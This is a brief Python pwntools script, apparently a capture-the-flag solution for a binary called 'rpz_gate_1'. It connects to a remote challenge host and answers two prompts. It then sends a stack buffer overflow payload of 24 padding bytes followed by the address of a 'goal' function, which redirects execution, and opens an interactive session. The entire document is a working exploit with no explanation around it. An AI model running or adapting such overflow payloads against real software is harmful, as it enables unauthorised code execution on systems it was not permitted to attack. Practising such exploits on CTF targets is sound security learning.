from pwn import *

context.binary = elf = ELF('./rpz_gate_1')

# pr = process()
pr = remote('94.237.59.176',42298)

pr.sendline(b'y')
pr.sendline(b'1')

pr.sendline(b'A'*24 + p64(elf.symbols['goal']))
pr.interactive()